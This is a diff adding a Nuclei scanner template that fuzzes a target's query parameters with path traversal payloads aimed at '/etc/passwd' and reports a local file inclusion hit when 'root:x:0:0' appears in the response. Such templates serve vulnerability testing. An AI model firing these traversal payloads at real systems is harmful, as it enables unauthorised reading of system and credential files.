@@ -1,0 +1,29 @@
+id: nawab-smart-lfi
+
+info:
+  name: 📂 Nawab-Smart-LFI-Scanner 📂
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      lfi_payloads:
+        - "../../../../../etc/passwd"
+        - "..%2f..%2f..%2f..%2fetc/passwd"
+
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{lfi_payloads}}"
+
+    matchers:
+      - type: regex
+        name: "💀💀 [FOUND] LFI-CRITICAL: SYSTEM-FILE-READ 💀💀"
+        regex:
+          - "root:x:0:0"
+        part: body
